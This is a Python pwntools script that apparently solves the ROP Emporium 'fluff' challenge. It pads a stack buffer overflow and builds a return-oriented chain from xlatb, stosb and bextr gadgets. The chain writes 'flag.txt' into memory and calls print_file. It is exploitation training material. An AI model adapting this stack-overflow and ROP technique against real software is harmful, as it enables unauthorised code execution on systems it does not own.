from pwn import *

exe = context.binary = ELF("./fluff")

# Gadgets
pop_rdi = 0x4006A3
pop_rdx_rcx = 0x40062A  # pop rdx; pop rcx; add rcx,0x3ef2; bextr rbx,rcx,rdx; ret
xlatb = 0x400628  # xlatb; ret  (AL = [RBX + AL])
stosb = 0x400639  # stosb; ret  ([RDI] = AL, RDI++)
print_file = exe.plt["print_file"]
data_section = 0x601028

# Character source addresses (from .dynstr and .rodata)
char_addr = {
    "f": 0x4003C4,
    "l": 0x4003C1,
    "a": 0x4003D6,
    "g": 0x4003CF,
    ".": 0x4003C9,
    "t": 0x4003D8,
    "x": 0x4006C8,
}


def write_char(char_address, al):
    """
    Build gadget chain to write one character:
    1. Set RBX = char_address - al (via bextr gadget)
    2. xlatb: AL = [RBX + AL] = [char_address] = our character
    3. stosb: write AL to [RDI], then RDI++
    """
    chain = b""

    # We want RBX = char_address - al
    # Gadget does: add rcx, 0x3ef2; then bextr copies RCX -> RBX
    # So: RCX = (char_address - al) - 0x3ef2
    rcx_val = (char_address - al - 0x3EF2) & 0xFFFFFFFFFFFFFFFF

    chain += p64(pop_rdx_rcx)
    chain += p64(0x4000)  # RDX: extract all 64 bits (copies RCX to RBX)
    chain += p64(rcx_val)  # RCX: after add 0x3ef2, becomes char_address - al
    chain += p64(xlatb)  # AL = [RBX + AL] = character
    chain += p64(stosb)  # [RDI] = AL; RDI++

    return chain


def exploit():
    r = process(exe.path)

    # Padding to reach return address (40 bytes)
    padding = b"A" * 40

    # Build ROP chain
    rop = b""

    # Step 0: Set RDI to .data section (destination for our string)
    rop += p64(pop_rdi)
    rop += p64(data_section)

    # Write "flag.txt" one byte at a time
    target = "flag.txt"

    # Initial AL value - try 0x00 first, adjust if needed
    al = 0x00

    for char in target:
        char_address = char_addr[char]
        rop += write_char(char_address, al)
        al = ord(char)  # After stosb, AL = the character we just wrote

    # Final: Call print_file(0x601028)
    rop += p64(pop_rdi)
    rop += p64(data_section)
    rop += p64(print_file)

    # Send payload
    payload = padding + rop

    log.info(f"Payload length: {len(payload)} bytes")
    r.sendlineafter(b"> ", payload)

    # Get output
    r.interactive()


if __name__ == "__main__":
    exploit()
